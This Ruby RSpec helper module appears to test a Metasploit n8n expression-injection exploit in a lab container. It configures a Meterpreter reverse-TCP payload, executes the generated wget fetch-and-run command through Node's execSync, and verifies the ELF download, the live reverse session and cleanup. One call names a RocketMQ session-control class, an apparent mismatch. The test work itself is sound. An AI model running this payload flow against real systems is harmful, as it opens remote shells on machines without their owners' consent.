# frozen_string_literal: true

require_relative '../laravel/sessions'
require_relative '../n8n_expression/acceptance'

# Calibrate the unchanged default fetch producer before the real expression path.
module N8nExpressionSessions
  include LaravelSessions
  include N8nExpressionTarget

  PAYLOAD = 'cmd/linux/http/x64/meterpreter_reverse_tcp'

  def laravel_component
    'nworkflow'
  end

  def laravel_owner
    N8nExpressionTarget::OWNER
  end

  def laravel_uid
    1000
  end

  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'n8n-expression-sessions.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def rc_resource_roles
    %w[target reporting_db]
  end

  def session_families
    { 'wget-inline' => [0, PAYLOAD, 'meterpreter'] }
  end

  def session_default_options
    { 'wget-inline' => %w[TARGET PAYLOAD] }
  end

  def session_control_name
    'N8nSessionControl'
  end

  def session_health_path
    '/rest/settings'
  end

  def session_payload_options(_family)
    {
      'FETCH_SRVHOST' => @listener_host, 'FETCH_SRVPORT' => LaravelSessions::FETCH_PORT,
      'FetchListenerBindAddress' => '0.0.0.0', 'FETCH_WRITABLE_DIR' => '/tmp', 'FETCH_FILENAME' => File.basename(session_fetch_path)
    }
  end

  def session_owner_options(options)
    @rc.fetch(:readiness).fetch('credentials').merge(options.except('HttpClientTimeout'))
  end

  def node(action, *)
    output, = rc_command('node-' + action, 'target', 'node', '/opt/module-target-n8n-session.cjs', action, *)
    JSON.parse(output)
  end

  def file(path)
    value = node('file', path)
    @rc[:files] << { path: path, value: value }
    value
  ensure
    rc_save
  end

  def process_state
    state = node('state', LaravelSessions::CALLBACK_PORT.to_s)
    state.fetch('processes').reject! do |row|
      row.fetch('command') == session_health_command || row.values_at('uid', 'ppid', 'command') == ['0', 0, 'runc init']
    end
    state
  end

  def idle
    expect(rc_json('{sessions:framework.sessions.keys,jobs:framework.jobs.keys}')).to eq('sessions' => [], 'jobs' => [])
    expect(session_rows).to all(include('closed_at' => be_a(String))) if @workspace
    state = process_state
    @rc[:states] << { phase: 'idle', state: state }
    rc_save
    expect(state.fetch('connections')).to eq([])
    expect(fetch_listener_open?).to be(false)
    # HTTP health probes may change the app's unrelated inbound descriptor set.
    # PID plus start time still proves that every payload/helper process exited.
    expect(state.fetch('processes').map { |row| row.except('state', 'connection_inodes') }).to eq(@baseline.fetch('processes').map { |row| row.except('state', 'connection_inodes') })
    true
  end

  def callback_control
    server = TCPServer.new('0.0.0.0', LaravelSessions::CALLBACK_PORT)
    token = 'nworkflow-' + Rex::Text.rand_text_alphanumeric(24)
    task = Thread.new { Open3.capture3(*session_exec_argv('node', '/opt/module-target-n8n-session.cjs', 'callback', token, LaravelSessions::CALLBACK_PORT.to_s)) }
    task.report_on_exception = false
    raise Timeout::Error, 'No native n8n callback' unless IO.select([server], nil, nil, 8)

    peer = server.accept
    identity = JSON.parse(Timeout.timeout(5) { peer.gets })
    expect(identity).to include('token' => token, 'uid' => 1000)
    state = process_state
    process = state.fetch('processes').find { |row| row.fetch('pid') == identity.fetch('pid') }
    expect(process).to include('uid' => '1000', 'ppid' => identity.fetch('ppid'), 'birth' => be_a(String))
    connected = state.fetch('connections').select { |row| row.fetch('state') == '01' }.map { |row| row.fetch('inode') }
    expect(process.fetch('connection_inodes') & connected).not_to be_empty
    @rc[:callback] = { identity: identity, observed: state }
    peer.puts('ACK:' + token)
    peer.close
    output, error, status = Timeout.timeout(15) { task.value }
    @rc[:callback].merge!(stdout: output, stderr: error, exit: status.exitstatus)
    expect(status.success?).to be(true), output + error
    expect(JSON.parse(output)).to eq(identity)
    @listener_host = identity.fetch('host')
    settled
  ensure
    peer&.close unless peer&.closed?
    server&.close
    task&.join(15)
    rc_save
  end

  def native_session(family)
    attempt = { family: family, owner: 'exploit/multi/handler', payload: PAYLOAD }
    @rc[:attempts] << attempt
    log_path = session_fetch_path + '-output'
    expect(file(session_fetch_path)).to eq('exists' => false)
    console_command('back')
    console_command('use exploit/multi/handler')
    settings = {
      'PAYLOAD' => PAYLOAD, 'FETCH_COMMAND' => 'wget', 'LHOST' => @listener_host, 'LPORT' => LaravelSessions::CALLBACK_PORT,
      'ReverseListenerBindAddress' => '0.0.0.0', 'ExitOnSession' => false, 'ListenerTimeout' => 60,
      'SessionCommunicationTimeout' => 10, 'SessionExpirationTimeout' => 90
    }.merge(session_payload_options(family))
    settings.each { |key, value| expect(console_command("set #{key} #{value}")).not_to include('Unknown datastore option') }
    attempt[:handler_output] = console_command('run -j -z')
    attempt[:generated] = rc_json("begin;job=framework.jobs.values.find{|entry|entry.ctx.first.fullname=='exploit/multi/handler'};raise 'No handler' unless job;RocketmqSessionControl.command(job,#{PAYLOAD.inspect});end")
    program = "const fs=require('fs');try{const result=require('child_process').execSync(Buffer.from(process.argv[1],'base64').toString());fs.writeFileSync(process.argv[2],result);}catch(error){fs.writeFileSync(process.argv[2],String(error));process.exitCode=1;}"
    # The stock producer command reaches the same Node execSync primitive, with
    # no backgrounding, substitutions, or redirection added to that command.
    output, error, status = Open3.capture3(*session_exec_argv('node', '-e', program, attempt.fetch(:generated).fetch('command_base64'), log_path, detached: true))
    attempt[:launch] = { program: program, stdout: output, stderr: error, exit: status.exitstatus }
    expect(status.success?).to be(true), error
    use_session(family, attempt, 'exploit/multi/handler')
    passed = true
  ensure
    primary = $ERROR_INFO
    attempt[:failure] = { type: primary.class.name, message: primary.message } if primary
    begin
      attempt[:final_process_state] = process_state
      attempt[:process_output] = file(log_path) if log_path
      node('remove', log_path) if log_path
      node('remove', session_fetch_path)
      cleanup_session
      @rc[:calibrated] << family if passed
    rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
      attempt[:cleanup_error] = { type: e.class.name, message: e.message }
      raise unless primary
    ensure
      rc_save
    end
  end

  def use_session(family, attempt, owner)
    metadata = await_session(PAYLOAD, owner)
    expect(rc_json('framework.sessions.keys')).to eq([metadata.fetch('id')])
    attempt[:registry_live] = n8n_native('registry')
    expect(attempt.fetch(:registry_live)).to eq('preserved' => true, 'flow_ids' => @rc.fetch(:readiness).fetch('foreign_ids'))
    delivered = rc_poll(10) do
      path = File.join(target_runtime.fetch('artifacts'), 'n8n-session-fetch.jsonl')
      rows = File.exist?(path) ? File.readlines(path).map { |line| JSON.parse(line) } : []
      rows.last if rows.length > @rc.fetch(:fetch_count, 0)
    end
    @rc[:fetch_count] = @rc.fetch(:fetch_count, 0) + 1
    attempt[:delivered] = delivered
    bytes = Base64.strict_decode64(delivered.fetch('base64'))
    expect(bytes).to start_with("\x7fELF".b)
    expect(bytes.getbyte(4)).to eq(2)
    expect(bytes.byteslice(18, 2).unpack1('v')).to eq(62)
    expect(Digest::SHA256.hexdigest(bytes)).to eq(delivered.fetch('sha256'))
    expect(file(session_fetch_path)).to eq('exists' => true, 'uid' => 1000, 'base64' => delivered.fetch('base64'))
    if owner == laravel_owner
      attempt[:events] = rc_json('framework.instance_variable_get(:@n8n_expression_events)').drop(@rc.fetch(:owner_event_cursor, 0))
      @rc[:owner_event_cursor] = rc_json('framework.instance_variable_get(:@n8n_expression_events).length')
      attempt[:defaults] = rc_json('{target:active_module.target_index,payload:active_module.datastore["PAYLOAD"],fetch_command:active_module.datastore["FETCH_COMMAND"],fetch_delete:active_module.datastore["FETCH_DELETE"]}')
      expect(attempt.fetch(:defaults)).to include('target' => 0, 'payload' => PAYLOAD, 'fetch_command' => 'wget', 'fetch_delete' => false)
      expect(attempt.fetch(:events).count { |row| row['owner_exploit_body'] }).to eq(1)
      commands = attempt.fetch(:events).filter_map { |row| row['command_base64'] }
      expect(commands.length).to eq(1)
      expect(Base64.strict_decode64(commands.first)).to start_with('wget -qO ')
    end
    super
    process = attempt.fetch(:live_state).fetch('processes').find { |row| row.fetch('pid') == attempt.fetch(:proof).fetch('pid') }
    connections = attempt.fetch(:live_state).fetch('connections').select { |row| row.fetch('state') == '01' }
    expect(connections.length).to eq(1)
    expect(process.fetch('connection_inodes')).to include(connections.first.fetch('inode'))
    # FETCH_DELETE is false by default. Record the retained executable before
    # deliberate fixture removal, rather than claiming automatic file cleanup.
    attempt[:retained_fetch_after_shutdown] = file(session_fetch_path)
    expect(attempt.fetch(:retained_fetch_after_shutdown)).to eq('exists' => true, 'uid' => 1000, 'base64' => delivered.fetch('base64'))
    expect(node('remove', session_fetch_path)).to eq('exists' => false)
    n8n_registry
  ensure
    rc_save
  end
end
